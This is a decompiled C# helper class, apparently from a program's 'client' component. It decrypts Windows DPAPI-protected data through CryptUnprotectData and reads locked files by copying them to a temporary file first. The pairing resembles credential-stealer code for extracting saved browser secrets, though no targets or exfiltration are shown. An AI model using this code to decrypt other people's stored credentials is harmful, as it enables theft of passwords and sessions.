using System;
using System.IO;
using System.Runtime.InteropServices;

namespace client.Helpers
{
	// Token: 0x02000017 RID: 23
	internal class FileHelper
	{
		// Token: 0x060000A9 RID: 169
		[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptUnprotectData(ref FileHelper.DataBlob pCipherText, ref string pszDescription, ref FileHelper.DataBlob pEntropy, IntPtr pReserved, ref FileHelper.CryptprotectPromptstruct pPrompt, int dwFlags, ref FileHelper.DataBlob pPlainText);

		// Token: 0x060000AA RID: 170 RVA: 0x000029A8 File Offset: 0x00000BA8
		public static byte[] Decrypt(byte[] bCipher, byte[] bEntropy = null)
		{
			FileHelper.DataBlob dataBlob = default(FileHelper.DataBlob);
			FileHelper.DataBlob dataBlob2 = default(FileHelper.DataBlob);
			FileHelper.DataBlob dataBlob3 = default(FileHelper.DataBlob);
			FileHelper.CryptprotectPromptstruct cryptprotectPromptstruct = new FileHelper.CryptprotectPromptstruct
			{
				cbSize = Marshal.SizeOf(typeof(FileHelper.CryptprotectPromptstruct)),
				dwPromptFlags = 0,
				hwndApp = IntPtr.Zero,
				szPrompt = null
			};
			string empty = string.Empty;
			try
			{
				try
				{
					if (bCipher == null)
					{
						bCipher = new byte[0];
					}
					dataBlob2.pbData = Marshal.AllocHGlobal(bCipher.Length);
					dataBlob2.cbData = bCipher.Length;
					Marshal.Copy(bCipher, 0, dataBlob2.pbData, bCipher.Length);
				}
				catch
				{
				}
				try
				{
					if (bEntropy == null)
					{
						bEntropy = new byte[0];
					}
					dataBlob3.pbData = Marshal.AllocHGlobal(bEntropy.Length);
					dataBlob3.cbData = bEntropy.Length;
					Marshal.Copy(bEntropy, 0, dataBlob3.pbData, bEntropy.Length);
				}
				catch
				{
				}
				FileHelper.CryptUnprotectData(ref dataBlob2, ref empty, ref dataBlob3, IntPtr.Zero, ref cryptprotectPromptstruct, 1, ref dataBlob);
				byte[] array = new byte[dataBlob.cbData];
				Marshal.Copy(dataBlob.pbData, array, 0, dataBlob.cbData);
				return array;
			}
			catch
			{
			}
			finally
			{
				if (dataBlob.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob.pbData);
				}
				if (dataBlob2.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob2.pbData);
				}
				if (dataBlob3.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob3.pbData);
				}
			}
			return new byte[0];
		}

		// Token: 0x060000AB RID: 171 RVA: 0x00002B5C File Offset: 0x00000D5C
		public static byte[] ReadFile(string file)
		{
			byte[] result;
			try
			{
				result = File.ReadAllBytes(file);
			}
			catch
			{
				string text = Path.Combine(new FileInfo(file).Directory.FullName, Path.GetFileNameWithoutExtension(file) + ".___");
				File.Copy(file, text);
				result = File.ReadAllBytes(text);
				File.Delete(text);
			}
			return result;
		}

		// Token: 0x02000018 RID: 24
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct CryptprotectPromptstruct
		{
			// Token: 0x0400005D RID: 93
			public int cbSize;

			// Token: 0x0400005E RID: 94
			public int dwPromptFlags;

			// Token: 0x0400005F RID: 95
			public IntPtr hwndApp;

			// Token: 0x04000060 RID: 96
			public string szPrompt;
		}

		// Token: 0x02000019 RID: 25
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct DataBlob
		{
			// Token: 0x04000061 RID: 97
			public int cbData;

			// Token: 0x04000062 RID: 98
			public IntPtr pbData;
		}
	}
}
